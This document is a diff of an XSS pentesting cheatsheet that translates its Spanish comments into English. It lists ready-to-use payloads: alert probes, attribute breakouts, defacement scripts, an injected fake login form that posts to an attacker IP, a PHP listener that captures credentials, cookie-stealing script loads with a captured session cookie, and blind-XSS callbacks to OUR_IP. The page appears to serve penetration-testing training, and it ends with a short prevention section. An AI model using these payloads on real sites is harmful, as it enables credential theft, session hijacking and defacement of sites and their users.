@@ -23,26 +23,26 @@ sidebar:
 ## Detection Payloads
 
 ```html
-<!-- Básico — funciona en la mayoría de contextos -->
+<!-- Basic — works in most contexts -->
 <script>alert(window.origin)</script>
 <script>alert(1)</script>
 <script>print()</script>
 
-<!-- Sin <script> — para innerHTML y DOM XSS -->
+<!-- Without <script> — for innerHTML and DOM XSS -->
 <img src="" onerror=alert(window.origin)>
 <img src=x onerror=alert(1)>
 
-<!-- Verificación visual sin JS -->
+<!-- Visual verification without JS -->
 <plaintext>
 
-<!-- Alternativas con event handlers -->
+<!-- Alternatives with event handlers -->
 <body onload=alert(1)>
 <svg onload=alert(1)>
 <input onfocus=alert(1) autofocus>
 <select onchange=alert(1)><option>1</option></select>
 <video src=x onerror=alert(1)>
 
-<!-- Break out de atributo -->
+<!-- Attribute break out -->
 '><script>alert(1)</script>
 "><script>alert(1)</script>
 "><img src=x onerror=alert(1)>
@@ -60,16 +60,16 @@ sidebar:
 document.URL
 document.location
 document.referrer
-location.hash          // fragmento #... de la URL
+location.hash          // #... fragment of the URL
 window.name
-// + cualquier input field leído con .value
+// + any input field read with .value
 ```
 
 ### Dangerous Sinks (Write HTML Unsanitized)
 
 ```javascript
-// JavaScript nativo
-element.innerHTML = userInput    // NO permite <script> pero sí <img onerror=>
+// Native JavaScript
+element.innerHTML = userInput    // Does NOT allow <script> but does allow <img onerror=>
 element.outerHTML = userInput
 document.write(userInput)
 document.writeln(userInput)
@@ -90,17 +90,17 @@ $('#el').replaceWith(userInput)
 ## Defacing (Stored XSS)
 
 ```javascript
-// Cambiar fondo de pantalla
+// Change background
 <script>document.body.style.background = "#141d2b"</script>
 <script>document.body.background = "https://evil.com/bg.jpg"</script>
 
-// Cambiar título de la página
+// Change page title
 <script>document.title = 'Hacked'</script>
 
-// Reemplazar todo el contenido del body
+// Replace the entire body content
 <script>document.getElementsByTagName('body')[0].innerHTML = '<h1>Hacked</h1>'</script>
 
-// Con jQuery (si está disponible)
+// With jQuery (if available)
 <script>$('body').html('<center><h1>Hacked</h1></center>')</script>
 ```
 
@@ -111,10 +111,10 @@ $('#el').replaceWith(userInput)
 ### Step 1 — Injecting a Fake Form
 
 ```javascript
-// Payload completo: escribir form + eliminar el form legítimo + comentar el resto
+// Complete payload: write form + delete the legitimate form + comment out the rest
 document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
 document.getElementById('urlform').remove();
-// Envía <!-- al final de la URL para comentar HTML residual
+// Sends <!-- at the end of the URL to comment out residual HTML
 ```
 
 ### Attack URL (Reflected)
@@ -151,7 +151,7 @@ if (isset($_GET['username']) && isset($_GET['password'])) {
 
 ```bash
 sudo php -S 0.0.0.0:80
-cat creds.txt    # ver credenciales capturadas
+cat creds.txt    # view captured credentials
 ```
 
 ---
@@ -183,19 +183,19 @@ if (isset($_GET['c'])) {
 ### XSS Payload to Load the Script
 
 ```bash
-# Iniciar server PHP
+# Start PHP server
 mkdir /tmp/tmpserver && cd /tmp/tmpserver
-# crear script.js e index.php
+# create script.js and index.php
 sudo php -S 0.0.0.0:80
 ```
 
 ```html
-<!-- Payload en el campo vulnerable -->
+<!-- Payload in the vulnerable field -->
 <script src=http://OUR_IP/script.js></script>
 ```
 
 ```bash
-# Verificar cookies capturadas
+# Verify captured cookies
 cat cookies.txt
 # Victim IP: 10.10.10.1 | Cookie: session=f904f93c949d19d870911bf8b05fe7b2
 ```
@@ -203,8 +203,8 @@ cat cookies.txt
 ### Using the Stolen Cookie in Firefox
 
 ```
-Shift+F9 → Storage → + → añadir Name=session, Value=f904f93c...
-→ Refresh → acceso como víctima
+Shift+F9 -> Storage -> + -> add Name=session, Value=f904f93c...
+-> Refresh -> access as victim
 ```
 
 ---
@@ -212,13 +212,13 @@ Shift+F9 → Storage → + → añadir Name=session, Value=f904f93c...
 ## Blind XSS — Identifying the Vulnerable Field
 
 ```html
-<!-- Identificar qué campo ejecuta XSS (sin ver la respuesta directamente) -->
+<!-- Identify which field executes XSS (without seeing the response directly) -->
 <script src=http://OUR_IP/fullname></script>
 <script src=http://OUR_IP/username></script>
 <script src=http://OUR_IP/email></script>
 <script src=http://OUR_IP/website></script>
 
-<!-- Variaciones para distintos contextos de inyección -->
+<!-- Variations for different injection contexts -->
 '><script src=http://OUR_IP/field></script>
 "><script src=http://OUR_IP/field></script>
 javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
@@ -226,9 +226,9 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\
 ```
 
 ```bash
-# Servidor escuchando — ver qué campo hace callback
+# Server listening — see which field makes callback
 sudo php -S 0.0.0.0:80
-# 10.10.10.1 [200]: /username → username es el campo vulnerable
+# 10.10.10.1 [200]: /username → username is the vulnerable field
 ```
 
 > **Fields to prioritize:** name, username, website — skip email (validated) and password (hashed).
@@ -238,15 +238,15 @@ sudo php -S 0.0.0.0:80
 ## Automated Tools
 
 ```bash
-# XSStrike — fuzzer de XSS
+# XSStrike — XSS fuzzer
 git clone https://github.com/s0md3v/XSStrike.git
 cd XSStrike && pip install -r requirements.txt
 python xsstrike.py -u "http://target/page?param=test"
 
-# Burp Pro Scanner / ZAP Active Scan → también detectan XSS automáticamente
-# Ver cheatsheet [Using Web Proxies](/en/metodologias/web/using-web-proxies/) para configuración
+# Burp Pro Scanner / ZAP Active Scan -> also detect XSS automatically
+# See cheatsheet [Using Web Proxies](/en/metodologias/web/using-web-proxies/) for configuration
 
-# Wordlists de payloads manuales
+# Manual payload wordlists
 # https://github.com/swisskyrepo/PayloadsAllTheThings (XSS Injection)
 # https://github.com/payload-box/xss-payload-list
 ```
@@ -256,21 +256,21 @@ python xsstrike.py -u "http://target/page?param=test"
 ## Prevention (for reporting / hardening)
 
 ```javascript
-// Frontend — sanitizar con DOMPurify
+// Frontend — sanitize with DOMPurify
 import DOMPurify from 'dompurify';
 let clean = DOMPurify.sanitize(userInput);
 
-// Evitar sinks peligrosos con input de usuario:
+// Avoid dangerous sinks with user input:
 // ❌ element.innerHTML = userInput
 // ✅ element.textContent = userInput
 ```
 
 ```php
 // Backend PHP — output encoding
-htmlentities($_GET['input']);      // encode todas las entidades HTML
+htmlentities($_GET['input']);      // encode all HTML entities
 htmlspecialchars($_GET['input']); // encode < > " ' &
 
-// Backend PHP — validación
+// Backend PHP — validation
 filter_var($_GET['email'], FILTER_VALIDATE_EMAIL);
 ```
 
